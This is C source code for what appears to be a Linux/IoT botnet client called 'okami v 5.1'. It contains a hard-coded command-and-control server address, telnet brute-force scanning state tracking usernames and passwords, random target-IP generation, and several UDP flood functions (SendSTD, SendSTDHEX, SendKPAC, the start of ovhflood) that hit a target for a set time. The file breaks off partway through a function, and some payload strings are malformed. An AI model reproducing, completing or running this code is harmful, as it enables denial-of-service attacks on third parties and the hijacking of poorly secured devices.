// okami v 5.1 clientside
#include <stdlib.h>
#include <stdarg.h>
#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>  
#include <arpa/inet.h>
#include <netdb.h>
#include <signal.h>                                                      
#include <strings.h>                                                      
#include <sys/utsname.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <netinet/tcp.h>
#include <sys/wait.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <time.h>
#include <dirent.h>
#include <limits.h>
#include <sys/stat.h>
#include <sys/time.h>
#include <string.h>
#include <stdint.h>
#include <stdio.h>
#include <sys/param.h>
#include <sys/time.h>

#include "killer.h"

#define PHI 0x9e3779b9
#define PR_SET_NAME 15
#define SERVER_LIST_SIZE (sizeof(commServer) / sizeof(unsigned char *))
#define PAD_RIGHT 1
#define PAD_ZERO 2
#define PRINT_BUF_LEN 12
#define CMD_IAC   255
#define CMD_WILL  251
#define CMD_WONT  252
#define CMD_DO    253
#define CMD_DONT  254
#define OPT_SGA   3
#define SOCKBUF_SIZE 1024
#define STD2_SIZE 69
#define kaden_std 1460
#define std_packet 1460
#define std_packet1 1460
#define std_packets 1294



unsigned char *commServer[] = { "134.122.33.137:443" };


char *getBuild() { 
#if defined(__x86_64__) || defined(_M_X64)
	return "x86_64";
#elif defined(i386) || defined(__i386__) || defined(__i386) || defined(_M_IX86_)
	return "x86_32";
#elif defined(__ARM_ARCH_2__)
	return "ARM2";
#elif defined(__ARM_ARCH_3__) || defined(__ARM_ARCH_3M__)
	return "ARM3";
#elif defined(__ARM_ARCH_4T__) || defined(__TARGET_ARM_4T)
	return "ARM4T";
#elif defined(__ARM_ARCH_5_) || defined(__ARM_ARCH_5E_)
	return "ARM5"
#elif defined(__ARM_ARCH_6T2_) || defined(__ARM_ARCH_6T2_)
	return "ARM6T2";
#elif defined(__ARM_ARCH_6__) || defined(__ARM_ARCH_6J__) || defined(__ARM_ARCH_6K__) || defined(__ARM_ARCH_6Z__) || defined(__ARM_ARCH_6ZK__)
	return "ARM6";
#elif defined(__ARM_ARCH_7__) || defined(__ARM_ARCH_7A__) || defined(__ARM_ARCH_7R__) || defined(__ARM_ARCH_7M__) || defined(__ARM_ARCH_7S__)
	return "ARM7";
#elif defined(__aarch64__)
	return "ARM64";
#elif defined(mips) || defined(__mips__) || defined(__mips)
	return "MIPS";
#elif defined(__sh__)
	return "SUPERH";
#elif defined(__powerpc) || defined(__powerpc__) || defined(__powerpc64__) || defined(__POWERPC__) || defined(__ppc__) || defined(__ppc64__) || defined(__PPC__) || defined(__PPC64__) || defined(_ARCH_PPC) || defined(_ARCH_PPC64)
	return "POWERPC";
#elif defined(__sparc__) || defined(__sparc)
	return "SPARC";
#elif defined(__m68k__)
	return "M68K";
#else
	return "UNKNOWN";
#endif
}
const char *useragents[] = {  
	"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36",
	"FAST-WebCrawler/3.6 (atw-crawler at fast dot no; http://fast.no/support/crawler.asp)",
	"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)",
	"TheSuBot/0.2 (www.thesubot.de)",
	"Opera/9.80 (X11; Linux i686; Ubuntu/14.10) Presto/2.12.388 Version/12.16",
	"BillyBobBot/1.0 (+http://www.billybobbot.com/crawler/)",
	"Mozilla/5.0 (Windows; U; Windows NT 6.1; rv:2.2) Gecko/20110201",
	"FAST-WebCrawler/3.7 (atw-crawler at fast dot no; http://fast.no/support/crawler.asp)",
	"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1",
	"zspider/0.9-dev http://feedback.redkolibri.com/",
	"Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)",
	"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)",
	"Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51",
	"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36",
	"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194ABaiduspider+(+http://www.baidu.com/search/spider.htm)",
	"Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko",
	"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko/20090327 Galeon/2.0.7",
	"Opera/9.80 (J2ME/MIDP; Opera Mini/5.0 (Windows; U; Windows NT 5.1; en) AppleWebKit/886; U; en) Presto/2.4.15",
	"Mozilla/5.0 (Android; Linux armv7l; rv:9.0) Gecko/20111216 Firefox/9.0 Fennec/9.0",
	"Mozilla/5.0 (iPhone; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10",
	"Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3)",
	"Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)",
	"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5",
	"Opera/9.80 (Windows NT 5.1; U; en) Presto/2.10.229 Version/11.60",
	"Mozilla/5.0 (iPad; U; CPU OS 5_1 like Mac OS X) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B367 Safari/531.21.10 UCBrowser/3.4.3.532",
	"Mozilla/5.0 (Nintendo WiiU) AppleWebKit/536.30 (KHTML, like Gecko) NX/3.0.4.2.12 NintendoBrowser/4.3.1.11264.US",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:25.0) Gecko/20100101 Firefox/25.0",
	"Mozilla/4.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/5.0)",
	"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; pl) Opera 11.00",
	"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; en) Opera 11.00",
	"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; ja) Opera 11.00",
	"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; cn) Opera 11.00",
	"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; fr) Opera 11.00",
	"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36",
	"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; FSL 7.0.6.01001)",
	"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; FSL 7.0.7.01001)",
	"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; FSL 7.0.5.01003)",
	"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:12.0) Gecko/20100101 Firefox/12.0",
	"Mozilla/5.0 (X11; U; Linux x86_64; de; rv:1.9.2.8) Gecko/20100723 Ubuntu/10.04 (lucid) Firefox/3.6.8",	
	"Mozilla/5.0 (Windows NT 5.1; rv:13.0) Gecko/20100101 Firefox/13.0.1",
	"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:11.0) Gecko/20100101 Firefox/11.0",
	"Mozilla/5.0 (X11; U; Linux x86_64; de; rv:1.9.2.8) Gecko/20100723 Ubuntu/10.04 (lucid) Firefox/3.6.8",
	"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; .NET CLR 1.0.3705)",
	"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:13.0) Gecko/20100101 Firefox/13.0.1",
	"Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)",
	"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)",
	"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)",
	"Opera/9.80 (Windows NT 5.1; U; en) Presto/2.10.289 Version/12.01",	
	"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727)",
	"Mozilla/5.0 (Windows NT 5.1; rv:5.0.1) Gecko/20100101 Firefox/5.0.1",
	"Mozilla/5.0 (Windows NT 6.1; rv:5.0) Gecko/20100101 Firefox/5.02",
	"Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.112 Safari/535.1",
	"Mozilla/4.0 (compatible; MSIE 6.0; MSIE 5.5; Windows NT 5.0) Opera 7.02 Bork-edition [en]",
	"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.116 Safari/537.36",
	"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.116 Safari/537.36",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.116 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.116 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36"
};

struct telstate_t {
        int fd;
        unsigned int ip;
        unsigned char state;
        unsigned char complete;
        unsigned char usernameInd; 	/* username 	*/
        unsigned char passwordInd; 	/* password 	*/
        unsigned char tempDirInd; 	/* tempdir 		*/
        unsigned int tTimeout;		/* totalTimeout */
        unsigned short bufUsed;
        char *sockbuf;
};
int initConnection();
void makeRandomStr(unsigned char *buf, int length);
int sockprintf(int sock, char *formatStr, ...);
int KHcommSOCK = 0;
char *inet_ntoa(struct in_addr in);
int mainCommSock = 0, currentServer = -1;
uint32_t *pids;
uint32_t scanPid;
uint64_t numpids = 0;
int killer_status = 0;
struct in_addr ourIP;
unsigned char macAddress[6] = {0};

					
static uint32_t Q[4096], c = 362436;
void init_rand(uint32_t x) {
        int i;
        Q[0] = x;
        Q[1] = x + PHI;
        Q[2] = x + PHI + PHI;
        for (i = 3; i < 4096; i++) Q[i] = Q[i - 3] ^ Q[i - 2] ^ PHI ^ i;
}
uint32_t rand_cmwc(void) {
        uint64_t t, a = 18782LL;
        static uint32_t i = 4095;
        uint32_t x, r = 0xfffffffe;
        i = (i + 1) & 4095;
        t = a * Q[i] + c;
        c = (uint32_t)(t >> 32);
        x = t + c;
        if (x < c) {
                x++;
                c++;
        }
        return (Q[i] = r - x);
}
int contains_string(char* buffer, char** strings) {
        int num_strings = 0, i = 0;
        for(num_strings = 0; strings[++num_strings] != 0; );
        for(i = 0; i < num_strings; i++) {
                if(strcasestr(buffer, strings[i])) {
                        return 1;
                }
        }
        return 0;
}
int read_with_timeout(int fd, int timeout_usec, char* buffer, int buf_size) {       
        fd_set read_set;
        struct timeval tv;
        tv.tv_sec = 0;
        tv.tv_usec = timeout_usec;
        FD_ZERO(&read_set);
        FD_SET(fd, &read_set);
        if (select(fd+1, &read_set, NULL, NULL, &tv) < 1)
        return 0;
        return recv(fd, buffer, buf_size, 0);
}
int read_until_response(int fd, int timeout_usec, char* buffer, int buf_size, char** strings) {
        int num_bytes, i;
        memset(buffer, 0, buf_size);
        num_bytes = read_with_timeout(fd, timeout_usec, buffer, buf_size);
        if(buffer[0] == 0xFF) {
                negotiate(fd, buffer, 3);
        }

        if(contains_string(buffer, strings)) {
                return 1;
        }

        return 0;
}
const char* get_telstate_host(struct telstate_t* telstate) { // get host
        struct in_addr in_addr_ip; 
        in_addr_ip.s_addr = telstate->ip;
        return inet_ntoa(in_addr_ip);
}
void advance_telstate(struct telstate_t* telstate, int new_state) { // advance
        if(new_state == 0) {
                close(telstate->fd);
        }
        telstate->tTimeout = 0;
        telstate->state = new_state;
        memset((telstate->sockbuf), 0, SOCKBUF_SIZE);
}
void reset_telstate(struct telstate_t* telstate) { // reset
        advance_telstate(telstate, 0);
        telstate->complete = 1;
}
void trim(char *str) {
        int i;
        int begin = 0;
        int end = strlen(str) - 1;

        while (isspace(str[begin])) begin++;

        while ((end >= begin) && isspace(str[end])) end--;
        for (i = begin; i <= end; i++) str[i - begin] = str[i];

        str[i - begin] = '\0';
}
static void printchar(unsigned char **str, int c) {
        if (str) {
                **str = c;
                ++(*str);
        }
        else (void)write(1, &c, 1);
}
static int prints(unsigned char **out, const unsigned char *string, int width, int pad) {
        register int pc = 0, padchar = ' ';
        if (width > 0) {
                register int len = 0;
                register const unsigned char *ptr;
                for (ptr = string; *ptr; ++ptr) ++len;
                if (len >= width) width = 0;
                else width -= len;
                if (pad & PAD_ZERO) padchar = '0';
        }
        if (!(pad & PAD_RIGHT)) {
                for ( ; width > 0; --width) {
                        printchar (out, padchar);
                        ++pc;
                }
        }
        for ( ; *string ; ++string) {
                printchar (out, *string);
                ++pc;
        }
        for ( ; width > 0; --width) {
                printchar (out, padchar);
                ++pc;
        }
        return pc;
}
static int printi(unsigned char **out, int i, int b, int sg, int width, int pad, int letbase) {
        unsigned char print_buf[PRINT_BUF_LEN];
        register unsigned char *s;
        register int t, neg = 0, pc = 0;
        register unsigned int u = i;
        if (i == 0) {
                print_buf[0] = '0';
                print_buf[1] = '\0';
                return prints (out, print_buf, width, pad);
        }
        if (sg && b == 10 && i < 0) {
                neg = 1;
                u = -i;
        }

        s = print_buf + PRINT_BUF_LEN-1;
        *s = '\0';
        while (u) {
                t = u % b;
                if( t >= 10 )
                t += letbase - '0' - 10;
                *--s = t + '0';
                u /= b;
        }
        if (neg) {
                if( width && (pad & PAD_ZERO) ) {
                        printchar (out, '-');
                        ++pc;
                        --width;
                }
                else {
                        *--s = '-';
                }
        }

        return pc + prints (out, s, width, pad);
}
static int print(unsigned char **out, const unsigned char *format, va_list args ) {
        register int width, pad;
        register int pc = 0;
        unsigned char scr[2];
        for (; *format != 0; ++format) {
                if (*format == '%') {
                        ++format;
                        width = pad = 0;
                        if (*format == '\0') break;
                        if (*format == '%') goto out;
                        if (*format == '-') {
                                ++format;
                                pad = PAD_RIGHT;
                        }
                        while (*format == '0') {
                                ++format;
                                pad |= PAD_ZERO;
                        }
                        for ( ; *format >= '0' && *format <= '9'; ++format) {
                                width *= 10;
                                width += *format - '0';
                        }
                        if( *format == 's' ) {
                                register char *s = (char *)va_arg( args, int );
                                pc += prints (out, s?s:"(null)", width, pad);
                                continue;
                        }
                        if( *format == 'd' ) {
                                pc += printi (out, va_arg( args, int ), 10, 1, width, pad, 'a');
                                continue;
                        }
                        if( *format == 'x' ) {
                                pc += printi (out, va_arg( args, int ), 16, 0, width, pad, 'a');
                                continue;
                        }
                        if( *format == 'X' ) {
                                pc += printi (out, va_arg( args, int ), 16, 0, width, pad, 'A');
                                continue;
                        }
                        if( *format == 'u' ) {
                                pc += printi (out, va_arg( args, int ), 10, 0, width, pad, 'a');
                                continue;
                        }
                        if( *format == 'c' ) {
                                scr[0] = (unsigned char)va_arg( args, int );
                                scr[1] = '\0';
                                pc += prints (out, scr, width, pad);
                                continue;
                        }
                }
                else {
out:
                        printchar (out, *format);
                        ++pc;
                }
        }
        if (out) **out = '\0';
        va_end( args );
        return pc;
}
int zprintf(const unsigned char *format, ...) {
        va_list args;
        va_start( args, format );
        return print( 0, format, args );
}
int szprintf(unsigned char *out, const unsigned char *format, ...) {
        va_list args;
        va_start( args, format );
        return print( &out, format, args );
}
int sockprintf(int sock, char *formatStr, ...) {
        unsigned char *textBuffer = malloc(2048);
        memset(textBuffer, 0, 2048);
        char *orig = textBuffer;
        va_list args;
        va_start(args, formatStr);
        print(&textBuffer, formatStr, args);
        va_end(args);
        orig[strlen(orig)] = '\n';
        zprintf("%s\n", orig);
        int q = send(sock,orig,strlen(orig), MSG_NOSIGNAL);
        free(orig);
        return q;
}
int wildString(const unsigned char* pattern, const unsigned char* string) {
        switch(*pattern) {
        case '\0': return *string;
        case '*': return !(!wildString(pattern+1, string) || *string && !wildString(pattern, string+1));
        case '?': return !(*string && !wildString(pattern+1, string+1));
        default: return !((toupper(*pattern) == toupper(*string)) && !wildString(pattern+1, string+1));
        }
}
int getHost(unsigned char *toGet, struct in_addr *i) {
        struct hostent *h;
        if((i->s_addr = inet_addr(toGet)) == -1) return 1;
        return 0;
}
void makeRandomStr(unsigned char *buf, int length) {
        int i = 0;
        for(i = 0; i < length; i++) buf[i] = (rand_cmwc()%(91-65))+65;
}
int recvLine(int socket, unsigned char *buf, int bufsize) {
        memset(buf, 0, bufsize);
        fd_set myset;
        struct timeval tv;
        tv.tv_sec = 30;
        tv.tv_usec = 0;
        FD_ZERO(&myset);
        FD_SET(socket, &myset);
        int selectRtn, retryCount;
        if ((selectRtn = select(socket+1, &myset, NULL, &myset, &tv)) <= 0) {
                while(retryCount < 10) {
                        tv.tv_sec = 30;
                        tv.tv_usec = 0;
                        FD_ZERO(&myset);
                        FD_SET(socket, &myset);
                        if ((selectRtn = select(socket+1, &myset, NULL, &myset, &tv)) <= 0) {
                                retryCount++;
                                continue;
                        }
                        break;
                }
        }
        unsigned char tmpchr;
        unsigned char *cp;
        int count = 0;
        cp = buf;
        while(bufsize-- > 1) {
                if(recv(mainCommSock, &tmpchr, 1, 0) != 1) {
                        *cp = 0x00;
                        return -1;
                }
                *cp++ = tmpchr;
                if(tmpchr == '\n') break;
                count++;
        }
        *cp = 0x00;
        return count;
}
int connectTimeout(int fd, char *host, int port, int timeout) {
        struct sockaddr_in dest_addr;
        fd_set myset;
        struct timeval tv;
        socklen_t lon;
        int valopt;
        long arg = fcntl(fd, F_GETFL, NULL);
        arg |= O_NONBLOCK;
        fcntl(fd, F_SETFL, arg);
        dest_addr.sin_family = AF_INET;
        dest_addr.sin_port = htons(port);
        if(getHost(host, &dest_addr.sin_addr)) return 0;
        memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);
        int res = connect(fd, (struct sockaddr *)&dest_addr, sizeof(dest_addr));
        if (res < 0) {
                if (errno == EINPROGRESS) {
                        tv.tv_sec = timeout;
                        tv.tv_usec = 0;
                        FD_ZERO(&myset);
                        FD_SET(fd, &myset);
                        if (select(fd+1, NULL, &myset, NULL, &tv) > 0) {
                                lon = sizeof(int);
                                getsockopt(fd, SOL_SOCKET, SO_ERROR, (void*)(&valopt), &lon);
                                if (valopt) return 0;
                        }
                        else return 0;
                }
                else return 0;
        }
        arg = fcntl(fd, F_GETFL, NULL);
        arg &= (~O_NONBLOCK);
        fcntl(fd, F_SETFL, arg);
        return 1;
}
int listFork() {
        uint32_t parent, *newpids, i;
        parent = fork();
        if (parent <= 0) return parent;
        numpids++;
        newpids = (uint32_t*)malloc((numpids + 1) * 4);
        for (i = 0; i < numpids - 1; i++) newpids[i] = pids[i];
        newpids[numpids - 1] = parent;
        free(pids);
        pids = newpids;
        return parent;
}
int negotiate(int sock, unsigned char *buf, int len) {
        unsigned char c;
        switch (buf[1]) {
        case CMD_IAC: return 0;
        case CMD_WILL:
        case CMD_WONT:
        case CMD_DO:
        case CMD_DONT:
                c = CMD_IAC;
                send(sock, &c, 1, MSG_NOSIGNAL);
                if (CMD_WONT == buf[1]) c = CMD_DONT;
                else if (CMD_DONT == buf[1]) c = CMD_WONT;
                else if (OPT_SGA == buf[1]) c = (buf[1] == CMD_DO ? CMD_WILL : CMD_DO);
                else c = (buf[1] == CMD_DO ? CMD_WONT : CMD_DONT);
                send(sock, &c, 1, MSG_NOSIGNAL);
                send(sock, &(buf[2]), 1, MSG_NOSIGNAL);
                break;
        default:
                break;
        }

        return 0;
}
int matchPrompt(char *bufStr) {
        char *prompts = ":>%$#\0";
        int bufLen = strlen(bufStr);
        int i, q = 0;
        for(i = 0; i < strlen(prompts); i++) {
                while(bufLen > q && (*(bufStr + bufLen - q) == 0x00 || *(bufStr + bufLen - q) == ' ' || *(bufStr + bufLen - q) == '\r' || *(bufStr + bufLen - q) == '\n')) q++;
                if(*(bufStr + bufLen - q) == prompts[i]) return 1;
        }
        return 0;
}

in_addr_t getRandomIP(in_addr_t netmask) {
        in_addr_t tmp = ntohl(ourIP.s_addr) & netmask;
        return tmp ^ ( rand_cmwc() & ~netmask);
}
unsigned short csum (unsigned short *buf, int count) {
        register uint64_t sum = 0;
        while( count > 1 ) { sum += *buf++; count -= 2; }
        if(count > 0) { sum += *(unsigned char *)buf; }
        while (sum>>16) { sum = (sum & 0xffff) + (sum >> 16); }
        return (uint16_t)(~sum);
}
in_addr_t findRandIP(in_addr_t netmask)
{
in_addr_t tmp = ntohl(ourIP.s_addr) & netmask;
return tmp ^ ( rand_cmwc() & ~netmask);
}
unsigned short tcpcsum(struct iphdr *iph, struct tcphdr *tcph) {
        struct tcp_pseudo {
                unsigned long src_addr;
                unsigned long dst_addr;
                unsigned char zero;
                unsigned char proto;
                unsigned short length;
        } pseudohead;
        unsigned short total_len = iph->tot_len;
        pseudohead.src_addr=iph->saddr;
        pseudohead.dst_addr=iph->daddr;
        pseudohead.zero=0;
        pseudohead.proto=IPPROTO_TCP;
        pseudohead.length=htons(sizeof(struct tcphdr));
        int totaltcp_len = sizeof(struct tcp_pseudo) + sizeof(struct tcphdr);
        unsigned short *tcp = malloc(totaltcp_len);
        memcpy((unsigned char *)tcp,&pseudohead,sizeof(struct tcp_pseudo));
        memcpy((unsigned char *)tcp+sizeof(struct tcp_pseudo),(unsigned char *)tcph,sizeof(struct tcphdr));
        unsigned short output = csum(tcp,totaltcp_len);
        free(tcp);
        return output;
}
void makeIPPacket(struct iphdr *iph, uint32_t dest, uint32_t source, uint8_t protocol, int packetSize) {
        iph->ihl = 5;
        iph->version = 4;
        iph->tos = 0;
        iph->tot_len = sizeof(struct iphdr) + packetSize;
        iph->id = rand_cmwc();
        iph->frag_off = 0;
        iph->ttl = MAXTTL;
        iph->protocol = protocol;
        iph->check = 0;
        iph->saddr = source;
        iph->daddr = dest;
}
int sclose(int fd) {
        if(3 > fd) return 1;
        close(fd);
        return 0;
}
void SendSTDHEX(unsigned char *ip, int port, int secs) 
{
	int std_hex;
	std_hex = socket(AF_INET, SOCK_DGRAM, 0);
	time_t start = time(NULL);
	struct sockaddr_in sin;
	struct hostent *hp;
	hp = gethostbyname(ip);
	bzero((char*) &sin,sizeof(sin));
	bcopy(hp->h_addr, (char *) &sin.sin_addr, hp->h_length);
	sin.sin_family = hp->h_addrtype;
	sin.sin_port = port;
	unsigned int a = 0;
	while(1)
	{
		char *hexstring[] = {"/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A"};
		if (a >= 50)
		{
			send(std_hex, hexstring, kaden_std, 0);
			connect(std_hex,(struct sockaddr *) &sin, sizeof(sin));
			if (time(NULL) >= start + secs)
			{
				close(std_hex);
				_exit(0);
			}
			a = 0;
		}
		a++;
	}
}
void SendSTD(unsigned char *ip, int port, int secs) {
int iSTD_Sock;
iSTD_Sock = socket(AF_INET, SOCK_DGRAM, 0);
time_t start = time(NULL);
struct sockaddr_in sin; 
struct hostent *hp;     
hp = gethostbyname(ip); 
bzero((char*) &sin,sizeof(sin));
bcopy(hp->h_addr, (char *) &sin.sin_addr, hp->h_length);
sin.sin_family = hp->h_addrtype;
sin.sin_port = port;
unsigned int a = 0;
while(1){
char *randstrings[] = {"WYHRzp68omQcEaoW","xYjPH0XYQyNnZDd4","Iger8HgN8DU5Cv2m","E0H2DeSLyzQ93Bh2","zhYf0MvzTJ1S0ivq","oqogARpMjAvdjr9Qsrqj","yQAkUvZFjxExI3WbDp2g","35arWHE38SmV9qbaEDzZ","UQX1v4chpBay13JL","a7pInUoLgx1CPFlGB5JF","X1k5ICjenaWIZ4Gf","S1mQMZYF6uLzzkiULnGF","jKdmCH3hamvbN7ZvzkNA","1cvFW1QcSuZ627CQ","VckeqgSPaAA5jHdoFpCC","CwT01MAGqrgYRStHcV0X","72qeggInemBIQ5uJc1jQ","zwcfbtGDTDBWImROXhdn","w70uUC1UJYZoPENznHXB","EoXLAf1xXR7j4XSs0JTm","UkXK4CDG3OBO1vVufiKv","lSvZgNzxkUyChyxw1nSr","VQz4cDTxV8RRrgn00toF","SllNepLi918c9I8J",};
char *STD2_STRING = randstrings[rand() % (sizeof(randstrings) / sizeof(char *))];
if (a >= 50)
{
send(iSTD_Sock, STD2_STRING, STD2_SIZE, 0);
connect(iSTD_Sock,(struct sockaddr *) &sin, sizeof(sin));
if (time(NULL) >= start + secs)
{
close(iSTD_Sock);
_exit(0);
}
a = 0;
}
a++;
}
}
void SendKPAC(unsigned char *ip, int port, int secs) {
    int std_hex;
    std_hex = socket(AF_INET, SOCK_DGRAM, 0);
    time_t start = time(NULL);
    struct sockaddr_in sin;
    struct hostent *hp;
    int rport;
  unsigned char *hexstring = malloc(1024);
  memset(hexstring, 0, 1024);
    hp = gethostbyname(ip);
    bzero((char*) &sin,sizeof(sin));
    bcopy(hp->h_addr, (char *) &sin.sin_addr, hp->h_length);
    sin.sin_family = hp->h_addrtype;
    sin.sin_port = port;
    unsigned int a = 0;
    while(1)
    {
        char * randstrings[] = {
        "\0x0B\0x00\0x00\0x00\0x00\0xFF\0xFF\0xFF\0xFF\0xFF\0xFF",
        "\x06\x00\x00\x00c\xdd\x01\x01\x00",
        "\x0D\x1E\x1F\x12\x06\x62\x26\x12\x62\x0D\x12\x01\x06\x0D\x1C\x01\x32\x12\x6C\x63\x1B\x32\x6C\x63\x3C\x32\x62\x63\x6C\x26\x12\x1C\x12\x6C\x63\x62\x06\x12\x21\x2D\x32\x62\x11\x2D\x21\x32\x62\x10\x12\x01\x0D\x12\x30\x21\x2D\x30\x13\x1C\x1E\x10\x01\x10\x3E\x3C\x32\x37\x01\x0D\x10\x12\x12\x30\x2D\x62\x10\x12\x1E\x10\x0D\x12\x1E\x1C\x10\x12\x0D\x01\x10\x12\x1E\x1C\x30\x21\x2D\x32\x30\x2D\x30\x2D\x21\x30\x21\x2D\x3E\x13\x0D\x32\x20\x33\x62\x63\x12\x21\x2D\x3D\x36\x12\x62\x30\x61\x11\x10\x06\x00\x17\x22\x63\x2D\x02\x01\x6C\x6D\x36\x6C\x0D\x02\x16\x6D\x63\x12\x02\x61\x17\x63\x20\x22\x6C\x2D\x02\x63\x6D\x37\x22\x63\x6D\x00\x02\x2D\x22\x63\x6D\x17\x22\x2D\x21\x22\x63\x00\x30\x32\x60\x30\x00\x17\x22\x36\x36\x6D\x01\x6C\x0D\x12\x02\x61\x20\x62\x63\x17\x10\x62\x6C\x61\x2C\x37\x22\x63\x17\x0D\x01\x3D\x22\x63\x6C\x17\x01\x2D\x37\x63\x62\x00\x37\x17\x6D\x63\x62\x37\x3C\x54",
        };
        if (a >= 50)
        {
            hexstring = randstrings[rand() % (sizeof(randstrings) / sizeof(char *))];
            send(std_hex, hexstring, std_packets, 0);
            connect(std_hex,(struct sockaddr *) &sin, sizeof(sin));
            if (time(NULL) >= start + secs)
            {
                close(std_hex);
                _exit(0);
            }
            a = 0;
        }
        a++;
    }
}
void ovhflood(unsigned char *target, int port, int timeEnd, int spoofit, int packetsize, int pollinterval)
{
        register unsigned int pollRegister;
        pollRegister = pollinterval;

        struct sockaddr_in dest_addr;

        dest_addr.sin_family = AF_INET;
